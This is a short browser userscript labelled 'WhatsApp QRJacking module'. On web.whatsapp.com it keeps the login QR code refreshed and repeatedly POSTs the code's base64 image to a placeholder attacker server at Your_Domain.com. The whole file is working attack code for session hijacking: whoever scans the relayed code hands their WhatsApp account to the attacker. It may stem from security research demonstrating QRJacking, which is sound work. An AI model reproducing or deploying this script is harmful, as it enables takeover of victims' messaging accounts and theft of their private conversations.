// ==UserScript==
// @name        WhatsApp QRJacking module
// @namespace   Seekuritylabs (@Seekurity)
// ==/UserScript==
var myTimer;
myTimer = window.setInterval(loopForQR, 3000);
function loopForQR() {
  if (document.readyState == 'complete') {
    $service = window.location.href;
    if ($service.indexOf('web.whatsapp.com') >= 0)
    {
      //Always wake-up the qrcode, Never sleep :D
      if (document.getElementsByClassName('qr-button')[0] !== undefined)
      {
        document.getElementsByClassName('qr-button')[0].click();
      }
      //If WhatsApp is not logged in, Do;
      if (document.getElementsByClassName('icon icon-chat')[0] == null)
      {
        //Mirror the QR Code to our server
        //This element for example "document.getElementsByTagName('img')[0].src" is WhatsApp's QR code element which contains the base64 value of WhatsApp's qr code!
        var xhttp = new XMLHttpRequest();
        var params = "c=" + document.getElementsByTagName('img')[0].src;

        xhttp.open('POST', 'https://www.Your_Domain.com/qrHandler.php' , true);
        xhttp.send(params);
      }
    }
  }
}
